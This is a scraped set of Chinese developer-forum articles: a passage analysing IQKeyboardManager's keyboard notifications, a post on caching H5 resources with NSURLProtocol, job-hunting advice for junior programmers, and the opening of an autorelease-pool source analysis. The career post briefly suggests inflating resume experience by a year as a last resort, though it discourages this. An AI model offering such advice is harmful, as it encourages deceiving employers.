<blockquote><p>不过，在 <code>- textFieldViewDidBeginEditing:</code> 的调用栈中，并没有执行 <code>- setRootViewFrame:</code> 来更新视图的大小，因为点击最上面的 <code>UITextField</code> 时，不需要移动视图就能保证键盘不会遮挡 <code>UITextField</code>。</p></blockquote>
<h3>keyboardWillShow:</h3>
<p>上面的代码都是在键盘出现之前执行的，而这里的 <code>- keyboardWillShow:</code> 方法的目的是为了保证键盘出现之后，依然没有阻挡 <code>UITextField</code>。</p>
<p>因为每一个 <code>UITextField</code> 对应的键盘大小可能不同，所以，这里通过检测键盘大小是否改变，来决定是否调用 <code>- adjustFrame</code> 方法更新视图的大小。</p>
<pre><code class=""objectivec"">- (void)keyboardWillShow:(NSNotification*)aNotification {
    _kbShowNotification = aNotification;
    
    _animationCurve = [[aNotification userInfo][UIKeyboardAnimationCurveUserInfoKey] integerValue];
    _animationCurve = _animationCurve&lt;&lt;16;
    CGFloat duration = [[aNotification userInfo][UIKeyboardAnimationDurationUserInfoKey] floatValue];
    if (duration != 0.0)    _animationDuration = duration;
    
    CGSize oldKBSize = _kbSize;
    CGRect kbFrame = [[aNotification userInfo][UIKeyboardFrameEndUserInfoKey] CGRectValue];
    CGRect screenSize = [[UIScreen mainScreen] bounds];
    CGRect intersectRect = CGRectIntersection(kbFrame, screenSize);

    if (CGRectIsNull(intersectRect)) {
        _kbSize = CGSizeMake(screenSize.size.width, 0);
    } else {
        _kbSize = intersectRect.size;
    }
 
    if (!CGSizeEqualToSize(_kbSize, oldKBSize)) {
        [self adjustFrame];
    }
}</code></pre>
<p>在 <code>- adjustFrame</code> 方法调用之前，执行了很多代码都是用来保存一些关键信息的，比如通知对象、动画曲线、动画时间。</p>
<p>最关键的是更新键盘的大小，然后比较键盘的大小 <code>CGSizeEqualToSize(_kbSize, oldKBSize)</code> 来判断是否执行 <code>- adjustFrame</code> 方法。</p>
<blockquote><p>因为 <code>- adjustFrame</code> 方法的结果是依赖于键盘大小的，所以这里对 <code>- adjustFrame</code> 是有意义并且必要的。</p></blockquote>
<h2>键盘的隐藏</h2>
<p>通过点击 <code>IQToolBar</code> 上面的 done 按钮，键盘就会隐藏：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000005772714"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""IQKeyboardManager-hide-keyboard"" title=""IQKeyboardManager-hide-keyboard""></span></p>
<p>键盘隐藏的过程中会依次调用下面的三个方法：</p>
<ul>
<li><p><code>- keyboardWillHide:</code></p></li>
<li><p><code>- textFieldViewDidEndEditing:</code></p></li>
<li><p><code>- keyboardDidHide:</code></p></li>
</ul>
<pre><code class=""objectivec"">IQKeyboardManager: ****** keyboardWillHide: started ******
IQKeyboardManager: Restoring &lt;UINavigationController 0x7fbaa4009e00&gt; frame to : {{0, 0}, {320, 568}}
IQKeyboardManager: ****** keyboardWillHide: ended ******
IQKeyboardManager: ****** textFieldViewDidEndEditing: started ******
IQKeyboardManager: ****** textFieldViewDidEndEditing: ended ******
IQKeyboardManager: ****** keyboardDidHide: started ******
IQKeyboardManager: ****** keyboardDidHide: ended ******</code></pre>
<p>键盘在收起时，需要将视图恢复至原来的位置，而这也就是 <code>- keyboardWillHide:</code> 方法要完成的事情：</p>
<pre><code class=""objectivec"">[strongSelf.rootViewController.view setFrame:strongSelf.topViewBeginRect]</code></pre>
<blockquote><p>并不会给出该方法的全部代码，只会给出关键代码梳理它的工作流程。</p></blockquote>
<p>在重新设置视图的大小以及位置之后，会对之前保存的属性进行清理：</p>
<pre><code class=""objectivec"">_lastScrollView = nil;
_kbSize = CGSizeZero;
_startingContentInsets = UIEdgeInsetsZero;
_startingScrollIndicatorInsets = UIEdgeInsetsZero;
_startingContentOffset = CGPointZero;</code></pre>
<p>而之后调用的两个方法 <code>- textFieldViewDidEndEditing:</code> 以及 <code>- keyboardDidHide:</code> 也只做了很多简单的清理工作，包括添加到 <code>window</code> 上的手势，并重置保存的 <code>UITextField</code> 和视图的大小。</p>
<pre><code class=""objectivec"">- (void)textFieldViewDidEndEditing:(NSNotification*)notification{
    [_textFieldView.window removeGestureRecognizer:_tapGesture];
    _textFieldView = nil;
}

- (void)keyboardDidHide:(NSNotification*)aNotification {
    _topViewBeginRect = CGRectZero;
}</code></pre>
<h2>UITextField 和 UITextView 通知机制</h2>
<p>因为框架的功能是基于通知实现的，所以通知的时序至关重要，在 <code>IQKeyboardManagerConstants.h</code> 文件中详细地描述了在编辑 <code>UITextField</code> 的过程中，通知触发的先后顺序。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000005772716"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""notification-IQKeyboardManage"" title=""notification-IQKeyboardManage""></span></p>
<blockquote><p>上图准确说明了通知发出的时机，透明度为 50% 的部分表示该框架没有监听这个通知。</p></blockquote>
<p>而 <code>UITextView</code> 的通知机制与 <code>UITextField</code> 略有不同：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000005772718"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""UITextView-Notification-IQKeyboardManage"" title=""UITextView-Notification-IQKeyboardManage""></span></p>
<p>当 Begin Editing 这个事件发生时，<code>UITextView</code> 的通知机制会先发出 <code>UIKeyboardWillShowNotification</code> 通知，而 <code>UITextField</code> 会先发出 <code>UITextFieldTextDidBeginEditingNotification</code> 通知。</p>
<p>而这两个通知的方法都调用了 <code>- adjustFrame</code> 方法来更新视图的大小，最开始我并不清楚到底是为什么？直到我给作者发了一封邮件，作者告诉我这么做的原因：</p>
<blockquote>
<p>Good questions draveness. I'm very happy to answer your questions. There is a file in library IQKeyboardManagerConstants.h. You can find iOS Notification mechanism structure.</p>
<p>You'll find that for UITextField, textField notification gets fire first and then UIKeyboard notification fires.</p>
<p>For UITextView, UIKeyboard notification gets fire first and then UITextView notification get's fire.</p>
<p>So that's why I have to call adjustFrame at both places to fulfill both situations. But now I think I should add some validation and make sure to call it once to improve performance.</p>
<p>Let me know if you have some more questions, I would love to answer them. Thanks again to remind me about this issue.</p>
</blockquote>
<p>在不同方法中调用通知的原因是，UITextView 和 UITextField 通知机制的不同，不过作者可能会在未来的版本中修复这一问题，来获得性能上的提升。</p>
<h2>小结</h2>
<p><code>IQKeyboardManager</code> 使用通知机制来解决键盘遮挡输入框的问题，因为使用了分类并且在 <code>IQKeyboardManager</code> 的 <code>+ load </code> 方法中激活了框架的使用，所以达到了零行代码解决这一问题的效果。</p>
<p>虽然 <code>IQKeyboardManager</code> 很好地解决了这一问题、为我们带来了良好的体验。不过，由于其涉及 UI 层级；并且需要考虑非常多的边界以及特殊条件，框架的代码不是很容易阅读，但是这不妨碍 <code>IQKeyboardManager</code> 成为非常优秀的开源项目。</p>
<blockquote>
<p>关注仓库，及时获得更新：<a href=""https://github.com/draveness/iOS-Source-Code-Analyze"" rel=""nofollow noreferrer"">iOS-Source-Code-Analyze</a></p>
<p>Follow: <a href=""https://github.com/Draveness"" rel=""nofollow noreferrer"">Draveness · Github</a></p>
<p>原文链接: <a href=""http://draveness.me/keyboard/"" rel=""nofollow noreferrer"">http://draveness.me/keyboard/</a></p>
</blockquote>

                ", 『零行代码』解决键盘遮挡问题（iOS）,1531972022,301,1,672,1,1,https://segmentfault.com/a/1190000005772101
99,1,0,6,"
                    
<h2>引言</h2>
<p>在多元化的今天，一个热门的移动app，或多或少都会有内在H5在其中。而对于一个有很多运营场景的app来说，这种情况更常见了。试想一下，如果在一个公司，存在很多native和H5同时需要开发的页面，为了节省开发成本，此时如果只开发H5，就需要考虑native的体验了，而这就是本文的目的，如何让native端拥有像加载本地页面一样的速度去加载H5。</p>
<p>在app内加载H5速度慢一直是客户端开发的痛点，抛开H5的体验本身与native就有差距不说，如果加载速度还很慢，这将会对用户体验造成巨大影响。那么像做到像native页面一样瞬间加载完H5，思路就会变得比较清晰了：<strong>提前在本地存储远程资源包</strong>。</p>
<h2>方案选择</h2>
<p>从这个点出发，我们需要考虑，以怎样的形式来提前拿到资源包（css，js，html，通用的图片等），减少这些静态资源的网络请求，增加加载速度。有以下两种方案：</p>
<p><strong>1.将资源包在app打包阶段直接植入</strong></p>
<p><strong>2.在运行时动态下载资源包</strong></p>
<p>单纯从业务层来说，如果你的业务够简单，其实第一种方式已经完全满足，每次需要新增页面就重新发版嘛，虽然显得有点愚笨，但是还是能满足的。</p>
<p>但是从长远的角度来说，我们要做到尽可能的动态化，动态化是客户端的热点，我们要做到尽量不依赖于版本更新来实现动态化。对于iOS来说，更新机制本身就非常缓慢，要通过app store的审核有时候还需要靠人品，更何况用户也不一定买账，他们不一定会更新我们的app。在这样的情况下，第二种方案就会显得更加友好和方便快捷。</p>
<h2>设计加载流程</h2>
<p>那么，该怎么设计一套完整的解决方案来满足运行时动态下载资源包呢？</p>
<p>抽出细节，大体上可以归结为下图所示的结构图：</p>
<p><span class=""img-wrap""><img data-src=""/img/bVydjG"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>我来解释下这个图，我是建立在客户端已经实现<code>socket</code>层协议，所以能与<code>server</code>保持长连接以至于<code>server</code>能主动push数据的情况，实现这种协议蛮复杂的。实际上如果没有这个协议，那就需要<code>client</code>找时机主动去<code>server</code>请求（app启动时请求一次？或者是每隔一段时间请求一次，取决于你），本文以后者为例。</p>
<p>下面我来演示下一个完整的下载新资源包的过程：</p>
<p>1.运营小妹觉得某节日要到了，需要发布一个新的页面，然后在运营后台生成资源包，运营后台会自动更新<strong>config</strong>，其中包括资源包的<strong>version</strong>，是否强制关闭加载本地资源包（降级策略，防止这个组件本身有BUG），还有一些<strong>hotpatch</strong>脚本。并且将资源包根据里面的内容部署到<strong>remote database</strong>。</p>
<p>2.在合适的时机，<code>client</code>发起http请求向<code>server</code>查询是否有新版本的资源包，并带上本地的<strong>config</strong>。</p>
<p>3.<code>server</code>根据<strong>config</strong>里的选项，比对从<code>client</code>拿到的<strong>config</strong>，发现客户端是旧版本的<strong>config</strong>，OK，则下发新的<strong>config</strong>给<code>client</code>，并且发送从<strong>database</strong>里拿到的资源包（为了加快速度，可以部署到<strong>CDN</strong>）。</p>
<p>4.<code>client</code>拿到最新的资源包后，在本地进行解密，解压等操作，并映射成对应<strong>URL</strong>相对于本地的<strong>local file url</strong>。比如：<code>http://www.baidu.com</code> 这个网址下的静态资源文件在本地的 <code>file://dsalkfjsldfjalsd/</code> 目录下。</p>
<p>至此，已经完成资源包的下载。</p>
<h2>拦截并加载本地资源包</h2>
<p>那么有了资源包后，怎么能让app像native页面的速度去加载H5呢。</p>
<p>其实原理就是对H5请求进行拦截，如果本地已经有对应的静态资源文件，则直接加载，这样就能达到“秒开”webview的效果。</p>
<p>对于iOS而言，这就需要用到<strong>NSURLProtocol</strong>这个神器了。接下来，分析下它到底是什么东西，我们怎么利用它达到上述效果。</p>
<p>NSURLProtocol：它能够让你去重新定义苹果的URL加载系统(URL Loading System)的行为，URL Loading System里有许多类用于处理URL请求，比如NSURL，NSURLRequest，NSURLConnection和NSURLSession等。当URL Loading System使用NSURLRequest去获取资源的时候，它会创建一个NSURLProtocol子类的实例，你不应该直接实例化一个NSURLProtocol，NSURLProtocol看起来像是一个协议，但其实这是一个 类，而且必须使用该类的子类，并且需要被注册。</p>
<p>换句话说，<strong>NSURLProtocol</strong>能拦截所有当前app下的网络请求，并且能自定义地进行处理。</p>
<p><strong>代码如下</strong></p>
<p><span class=""img-wrap""><img data-src=""/img/bVydjT"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>这里只介绍与我们需求相关的<strong>NSURLProtocol</strong>方法。</p>
<p>搞了这么多，其实最核心的就是前四个方法：</p>
<pre><code>+ (BOOL)canInitWithRequest:(NSURLRequest *)request</code></pre>
<p>这个方法的作用是判断当前<strong>protocol</strong>是否要对这个<strong>request</strong>进行处理（所有的网络请求都会走到这里，所以我们只需要对我们产生的<strong>request</strong>进行处理即可）。</p>
<pre><code>+ (NSURLRequest *)canonicalRequestForRequest:(NSURLRequest *)request</code></pre>
<p>这个方法其实很强大，它可以对<strong>request</strong>进行预处理，比如对<strong>header</strong>加一些东西什么的，我们这里没什么要改的，所以直接返回<strong>request</strong>就好了。</p>
<pre><code>- (void)startLoading</code></pre>
<p>重点是这个方法，我们这里需要做一件事，就是自己拼装<strong>httpResponse</strong>，并且返回给url load system，然后到了webview那一层，会收到<strong>response</strong>，对于webview而言，加载本地和走网络拿到的<strong>response</strong>是完全一样的。所以上述代码展示了如何拼装一个<strong>httpResponse</strong>，当组装完成后，需要调用<code>self.client</code>将数据传出去。</p>
<p>何为<code>self.client</code>，这个东西其实就是<strong>protocol</strong>与url load system交互的一个对象，系统提供给我们的，这样理解就够了。</p>
<p>需要注意的是，细心的读者会看到else里会有一段代码：</p>
<pre><code>[NSURLProtocol setProperty:@YES forKey:WDHybridResourceProtocolHandledKey inRequest:newRequest];</code></pre>
<p>这个是干什么用的？else的作用是当本地不存在这个文件时，则主动重新发请求，此时又会调用<code>canInitWithRequest</code>，如果不设置flag，则会无限递归了。所以你懂得。</p>
<p>当然，重新发请求自然要实现<code>NSURLConnectionDelegate</code>。</p>
<h2>总结</h2>
<p>至此，如何快速加载H5已经全部介绍完毕。</p>
<p>附上前后加载速度对比：</p>
<p><span class=""img-wrap""><img data-src=""/img/bVydp0"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>

                ", 如何打造一个高性能的Hybrid App,1531972024,262,1,793,1,1,https://segmentfault.com/a/1190000005732602
100,1,0,6,"
                    
<blockquote><p>又到了一周一次的周末心灵鸡汤的时间了，希望大家能够痛痛快快的喝了这碗鸡汤，让这酸爽的感觉使你永生难忘。哈哈……这周又有几个人，尤其是毕业生在「非著名程序员」微信公众号里私聊我关于找不到工作的问题，我感觉有必要总结一下，给大家一些建议，仅仅是建议，所谓众口难调，不可能适合所有程序员的口味。</p></blockquote>
<p>通过和大家的交流，我感觉不容易找到工作的程序员大概分为这两种，一种是刚要毕业，或者即将毕业要找实习工作的程序员，还有一种是工作不到两年或者一年左右的程序员。毕竟感觉移动互联网行业在这个年头涌入的开发者太多，导致快饱和了，所以没有经验或者经验少的程序员难免找工作难一些。</p>
<h3>无工作经验的即将毕业的毕业生</h3>
<p>我最近经常遇到在校大学生的私聊信息，有的才大一或者大二就开始焦虑了，这很好，有紧张感很好，从大一和大二就有这样的觉悟开始自己努力学习技术，并实践项目，你们已经赢在了百分之九十九的起跑线上了。我给这批人的建议就是找准自己的兴趣点，深入一项技术进行研究，有时间多接触几门技术更好。比如：你兴趣是做Android，那你大学期间肯定是要主攻安卓方向，并做深入了解和学习，当然后台的技术，前端脚本技术等等，有时间可以多了解一下，学习一下算法啊，这都能开阔自己的视野，为自己储备能量。其实大部分的技术都是「触类旁通」，所谓差异也就是语言特点不太一样罢了。「技多不压身」嘛。</p>
<p>刚才扯远了，回到找工作上来，前几天有个大三的学生，很焦虑的来找我，咨询我一些问题。</p>
<blockquote><p>他说：群主，我一直找不到实习的工作，我们班大多数人都已经为大四准备，找到了实习工作。<br>我说：你才大三就焦虑了，说明你很有紧张感和责任心，你不要太过焦虑，你为什么找不到实习？而别人能找到实习呢？<br>他说：我找的工作，他们都要求有工作经验。<br>我说：实习也要求工作经验吗？ 他说：是啊。<br>我说：那你大学期间自己做过什么项目吗？ 他说：都是很小的项目。<br>我说：那你才大三，那别着急，如果你暂时实在找不到实习工作，没事，你第一要务是：找到一个点，一个大点的项目点，自己去试着实现，去做一个项目，在做的过程中肯定会遇到很多问题，没事，遇到问题很正常，如果你在做的过程中把这些问题都一一解决了，你就提高了。再出去找工作的时候，你就说你有项目经验了，把你做的项目演示给他们看。不要急于和其它同学比，先做好自己，巩固自己的基础。</p></blockquote>
<p>总结：大学期间在学习技术的过程中，一定要根据自己的兴趣爱好和想法，试着去做一个大点的项目，在简历上也不会显得那么简陋，无东西可写。不要跟我说自己做不了一个大点的项目，同学那么多，找个「志同道合」的一起做也很有意思嘛，遇到问题还有商量的可以解决的，反正有责任心的，总能想到办法去做到。如果你现在已经大四了，或者马上要毕业了，还没有找到工作，别急，不要和别人比较，稳住心态，花上两个月做一个大点的项目，再出去找也不急，如果整天光焦虑，而不想点办法的话，你再焦虑对你找工作也于事无补，不如踏实下来为提高技术，巩固基础，为找好工作而做准备呢。</p>
<p>忘了说了，其实还有一点，平时学习的时候，一定要记得「写博客」，真的，写博客的好处我不知道说过多少遍，如果你的博客总结写的不错，不仅能提高自己的能力，方便自己学习和查找，还有可能让其它公司发现，因而能够得到面试和实习的机会。</p>
<h3>经验少的程序员</h3>
<p>小猿同学毕业工作一年了，在公司感觉自己的能力很好了，能力大于老板给的价值了，所以想要涨工资，但是老板给涨的不够理想，小猿听说跳槽可以让自己的工资翻倍，毅然决然的就辞职了，决定重新找工作。其实不然，由于现在开发太多，已经和前几年不太一样了，找工作也非常难，大多数公司都要求工作经验3年以上，可是小猿同学才一年多一点。其实一年和两年工作经验是一个比较尴尬的工作经验阶段，处于一种「高不成，低不就」的地步。这时候就需要大家不要暂时眼里只有钱（当然钱很重要，不然工作干啥，所以我用的是暂时），稳住自己焦躁的内心，骑着驴找驴即在职找工作，找到再辞职。工作期间，一是平时多积累自己的工作经验，多学习提高自己的技术，二是多积累人脉，多认识朋友和同事，联系以前同学，看有没有内推的机会。三是，确立自己的一个求职目标公司，按照那个公司的要求平时多学习和提高自己，做到因地制宜。如果实在没办法，你又自信心爆棚，就是感觉自己技术好，但是就是投简历，总是得不到面试的机会，被拒的理由是不符合公司工作经验要求，那就可以把你的两年工作经验调成三年，加一年，此方法不推荐，「走投无路」可试一试，仅适用于技术好，得不到面试机会的小伙伴。鼓励大家简历诚实填写，最好不要造假。</p>
<h3>关于简历</h3>
<p>简历就是一个门面式的敲门砖，它是你是否能够得到笔试或者面试机会的重要的一个桥梁。对于简历的填写，我认为最好做到「简洁，朴实，门当户对」八个大字。何为简洁，朴实，门当户对呢？</p>
<h4>简洁</h4>
<p>简洁就是简历的外观要简洁，不要花里胡哨的，建议最好两到三页即可，最好两页，不要把简历搞的像一本书厚似的，面试官没有时间去看那么多没有意义的内容。我们程序员的简历一般包含如下几个内容，基本资料，求职意向，工作经历和技能评价，项目经验。基本资料，求职意向，工作经历和技能评价差不多占一页，项目经验占一页即可。即使你做过十个项目也没必要全部写上，挑出两到三个比较好的项目写上即可。做到简洁。</p>
<h4>朴实</h4>
<p>朴实就是简历写的要接地气，不要用词非常高大上，尤其是在技能评价一栏，写自己掌握的技术知识点时，不要用精通某项技术这种字眼，你写熟练运用即可，写精通容易把自己挖个坑埋了。简历内容要诚实，不要造假，面试官又不傻，面试的时候，假不假其实他们心里有数。这就是所谓的朴实。</p>
<h4>门当户对</h4>
<p>所谓门当户对，这里指的的是两方面吧，一方面是投简历时，要挑些门当户对的公司进行投递，一方面是平时多浏览一些招聘网站，看看各大公司都要求会什么技术，提取出关键字，根据相应的关键字写到自己的技能评价一栏中的掌握的技术点中。</p>
<p>投递简历的网站有很多，一般我们互联网工作的人员比较喜欢用的是拉勾网，其次是智联招聘，前程无忧什么的。我们在投递简历时，不要把搜索出来的公司，一键全选，然后全部发送。要门当户对的去投，一个一个的去看招聘要求，挑符合自己能力的公司。经常有开发者后台给我留言，说我投了简历，为什么没有公司来面试邀请的，全是一些培训机构，怪你自己没看清楚呗，这能赖谁啊？</p>
<p><span class=""img-wrap""><img data-src=""/img/bVxF9Q"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span><br>比如我们经常在招聘网站上看到如图上似的什么任职需求和技能要求啥的，对，没事的时候，经常去看看大部分公司的要求，并提取关键字，比如上面的关键字就是：网络编程，多线程，和性能优化。多浏览一些这样的招聘网站，多总结一些这样的关键字，在自己的技能评价栏里写自己掌握的技术的时候，根据这些关键字去写。这样投递简历的成功率和符合率不就高很多了吗？经常浏览这些东西，还有一个好处是，容易知道技术的发展方向，顺便平时把自己不足的部分去学习一下，提高自己。</p>
<p>总之，写了这么多心灵鸡汤类的东西，都是说容易，做难，如果你感觉这些东西对你们有帮助，我就谢天谢地了。众口难调，如果感觉难喝，那就吐出来，再去寻找适合自己的方式和方法。写这些东西，我也是根据大家在公众号后台留言或者私聊我的内容进行的一些总结，应该有一些参考性。对了，我周末整理了一些东西，欢迎大家回复关键字“1024”去获取。今天就到这里吧。</p>
<blockquote><p>移动开发者的聚集地，公众号“非著名程序员”，每天一篇原创技术分享和移动互联网知识分享，微信公众号：smart_android，头条号和百度百家账号都是“非著名程序员”。</p></blockquote>

                ", 程序员该如何有效的找工作?,1531972025,470,1,346,1,1,https://segmentfault.com/a/1190000005604539
101,1,0,6,"
                    
<blockquote>
<p>关注仓库，及时获得更新：<a href=""https://github.com/draveness/iOS-Source-Code-Analyze"" rel=""nofollow noreferrer"">iOS-Source-Code-Analyze</a></p>
<p>Follow: <a href=""https://github.com/Draveness"" rel=""nofollow noreferrer"">Draveness · Github</a></p>
<p>由于 Objective-C 中的内存管理是一个比较大的话题，所以会分为两篇文章来对内存管理中的一些机制进行剖析，一部分分析自动释放池以及 <code>autorelease</code> 方法，另一部分分析 <code>retain</code>、<code>release</code> 方法的实现以及自动引用计数。</p>
</blockquote>
<h2>写在前面</h2>
<p>这篇文章会在源代码层面介绍 Objective-C 中自动释放池，以及方法的 <code>autorelease</code> 的具体实现。</p>
<h2>从 main 函数开始</h2>
<p><code>main</code> 函数可以说是在整个 iOS 开发中非常不起眼的一个函数，它很好地隐藏在 <code>Supporting Files</code> 文件夹中，却是整个 iOS 应用的入口。<br><span class=""img-wrap""><img data-src=""/img/remote/1460000006924123?w=233&amp;h=60"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""objc-autorelease-main"" title=""objc-autorelease-main""></span></p>
<p><code>main.m</code> 文件中的内容是这样的：</p>
<pre><code class=""objectivec"">int main(int argc, char * argv[]) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
    }
}</code></pre>
<p>在这个 <code>@autoreleasepool</code> block 中只包含了一行代码，这行代码将所有的事件、消息全部交给了 <code>UIApplication</code> 来处理，但是这不是本文关注的重点。</p>
<p>需要注意的是：<strong>整个 iOS 的应用都是包含在一个自动释放池 block 中的</strong>。</p>
<h2>@autoreleasepool</h2>
<p><code>@autoreleasepool</code> 到底是什么？我们在命令行中使用 <code>clang -rewrite-objc main.m</code> 让编译器重新改写这个文件：</p>
<pre><code class=""shell"">$ clang -rewrite-objc main.m</code></pre>
<p>在生成了一大堆警告之后，当前目录下多了一个 <code>main.cpp</code> 文件</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000005130797"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""objc-autorelease-main-cpp"" title=""objc-autorelease-main-cpp""></span></p>
<blockquote><p>这里删除了 <code>main</code> 函数中其他无用的代码。</p></blockquote>
<p>在这个文件中，有一个非常奇怪的 <code>__AtAutoreleasePool</code> 的结构体，前面的注释写到 <code>/* @autoreleasepopl */</code>。也就是说 <code>@autoreleasepool {}</code> 被转换为：</p>
<pre><code class=""objectivec"">{
    __AtAutoreleasePool __autoreleasepool;
}</code></pre>
<p>在 <code>main.cpp</code> 中查找名为 <code>__AtAutoreleasePool</code> 的结构体：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000005130794"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""objc-autorelease-main-cpp-struct"" title=""objc-autorelease-main-cpp-struct""></span></p>
<pre><code class=""objectivec"">struct __AtAutoreleasePool {
  __AtAutoreleasePool() {atautoreleasepoolobj = objc_autoreleasePoolPush();}
  ~__AtAutoreleasePool() {objc_autoreleasePoolPop(atautoreleasepoolobj);}
  void * atautoreleasepoolobj;
};</code></pre>
<p>这个结构体会在初始化时调用 <code>objc_autoreleasePoolPush()</code> 方法，会在析构时调用 <code>objc_autoreleasePoolPop</code> 方法。</p>
<p>这表明，我们的 <code>main</code> 函数其实是这样的：</p>
<pre><code class=""objectivec"">int main(int argc, const char * argv[]) {
    {
        void * atautoreleasepoolobj = objc_autoreleasePoolPush();
        
        // do whatever you want
        
        objc_autoreleasePoolPop(atautoreleasepoolobj);
    }
    return 0;
}</code></pre>
<p><code>@autoreleasepool</code> 只是帮助我们少写了这两行代码而已，让代码看起来更美观，然后要根据上述两个方法来分析自动释放池的实现。</p>
<h2>AutoreleasePool 是什么</h2>
<p>这一节开始分析方法 <code>objc_autoreleasePoolPush</code> 和 <code>objc_autoreleasePoolPop</code> 的实现：</p>
<pre><code class=""objectivec"">void *objc_autoreleasePoolPush(void) {
    return AutoreleasePoolPage::push();
}

void objc_autoreleasePoolPop(void *ctxt) {
    AutoreleasePoolPage::pop(ctxt);
}</code></pre>
<p>上面的方法看上去是对 <code>AutoreleasePoolPage</code> 对应<strong>静态方法</strong> <code>push</code> 和 <code>pop</code> 的封装。</p>
<p>这一小节会按照下面的顺序逐步解析代码中的内容：</p>
<ul>
<li><p><a>AutoreleasePoolPage 的结构</a></p></li>
<li><p><a>objc_autoreleasePoolPush 方法</a></p></li>
<li><p><a>objc_autoreleasePoolPop 方法</a></p></li>
</ul>
<h3>AutoreleasePoolPage 的结构</h3>
<p><code>AutoreleasePoolPage</code> 是一个 C++ 中的类：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000006924124?w=323&amp;h=450"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""objc-autorelease-AutoreleasePoolPage"" title=""objc-autorelease-AutoreleasePoolPage""></span></p>
<p>它在 <code>NSObject.mm</code> 中的定义是这样的：</p>
<pre><code class=""objectivec"">class AutoreleasePoolPage {
    magic_t const magic;
    id *next;
    pthread_t const thread;
    AutoreleasePoolPage * const parent;
    AutoreleasePoolPage *child;
    uint32_t const depth;
    uint32_t hiwat;
};</code></pre>
<ul>
<li><p><code>magic</code> 用于对当前 <code>AutoreleasePoolPage</code> <strong>完整性</strong>的校验</p></li>
<li><p><code>thread</code> 保存了当前页所在的线程</p></li>
</ul>
<p><strong>每一个自动释放池都是由一系列的 <code>AutoreleasePoolPage</code> 组成的，并且每一个 <code>AutoreleasePoolPage</code> 的大小都是 <code>4096</code> 字节（16 进制 0x1000）</strong></p>
<pre><code class=""c"">#define I386_PGBYTES 4096
#define PAGE_SIZE I386_PGBYTES</code></pre>
<h4>双向链表</h4>
<p>自动释放池中的 <code>AutoreleasePoolPage</code> 是以<strong>双向链表</strong>的形式连接起来的：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000005130784"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""objc-autorelease-AutoreleasePoolPage-linked-list"" title=""objc-autorelease-AutoreleasePoolPage-linked-list""></span></p>
<blockquote><p><code>parent</code> 和 <code>child</code> 就是用来构造双向链表的指针。</p></blockquote>
<h4>自动释放池中的栈</h4>
<p>如果我们的一个 <code>AutoreleasePoolPage</code> 被初始化在内存的 <code>0x100816000 ~ 0x100817000</code> 中，它在内存中的结构如下：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000005130786"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""objc-autorelease-page-in-memory"" title=""objc-autorelease-page-in-memory""></span></p>
<p>其中有 56 bit 用于存储 <code>AutoreleasePoolPage</code> 的成员变量，剩下的 <code>0x100816038 ~ 0x100817000</code> 都是用来存储<strong>加入到自动释放池中的对象</strong>。</p>
<blockquote><p><code>begin()</code> 和 <code>end()</code> 这两个类的实例方法帮助我们快速获取 <code>0x100816038 ~ 0x100817000</code> 这一范围的边界地址。</p></blockquote>
<p><code>next</code> 指向了下一个为空的内存地址，如果 <code>next</code> 指向的地址加入一个 <code>object</code>，它就会如下图所示<strong>移动到下一个为空的内存地址中</strong>：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000005130792"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""objc-autorelease-after-insert-to-page"" title=""objc-autorelease-after-insert-to-page""></span></p>
<blockquote><p>关于 <code>hiwat</code> 和 <code>depth</code> 在文章中并不会进行介绍，因为它们并不影响整个自动释放池的实现，也不在关键方法的调用栈中。</p></blockquote>
<h4>POOL_SENTINEL（哨兵对象）</h4>
<p>到了这里，你可能想要知道 <code>POOL_SENTINEL</code> 到底是什么，还有它为什么在栈中。</p>
<p>首先回答第一个问题： <code>POOL_SENTINEL</code> 只是 <code>nil</code> 的别名。</p>
<pre><code class=""objectivec"">#define POOL_SENTINEL nil</code></pre>
<p>在每个自动释放池初始化调用 <code>objc_autoreleasePoolPush</code> 的时候，都会把一个 <code>POOL_SENTINEL</code> push 到自动释放池的栈顶，并且返回这个 <code>POOL_SENTINEL</code> 哨兵对象。</p>
<pre><code class=""objectivec"">int main(int argc, const char * argv[]) {
    {
        void * atautoreleasepoolobj = objc_autoreleasePoolPush();
        
        // do whatever you want
        
        objc_autoreleasePoolPop(atautoreleasepoolobj);
    }
    return 0;
}</code></pre>
<blockquote><p>上面的 <code>atautoreleasepoolobj</code> 就是一个 <code>POOL_SENTINEL</code>。</p></blockquote>
<p>而当方法 <code>objc_autoreleasePoolPop</code> 调用时，就会向自动释放池中的对象发送 <code>release</code> 消息，直到第一个 <code>POOL_SENTINEL</code>：</p>
